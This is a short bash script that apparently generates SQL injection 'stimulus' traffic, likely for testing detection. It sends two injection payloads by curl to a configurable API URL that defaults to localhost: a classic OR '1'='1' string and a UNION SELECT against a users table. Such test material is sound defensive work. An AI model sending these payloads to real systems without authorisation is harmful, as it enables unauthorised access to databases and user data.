#!/usr/bin/env bash
# -----------------------------------------------------------------------------
# Name: sqli.sh
# Purpose: Generate SQL injection stimulus payloads
#
# Inputs: None
#
# Environment:
#   API_URL (default: http://localhost)
#
# Exit Codes:
#   0 - Stimulus generated successfully
# -----------------------------------------------------------------------------
set -euo pipefail

API="${API_URL:-http://localhost}"

echo "[Stimulus] SQL Injection against $API"

# Classic OR injection
curl -s "$API/items/1'%20OR%20'1'='1" > /dev/null 2>&1 || true
echo "  Payload 1: OR injection sent"

# Union-based
curl -s "$API/items/1%20UNION%20SELECT%20*%20FROM%20users" > /dev/null 2>&1 || true
echo "  Payload 2: UNION injection sent"

echo "[Stimulus] SQLi complete"
exit 0
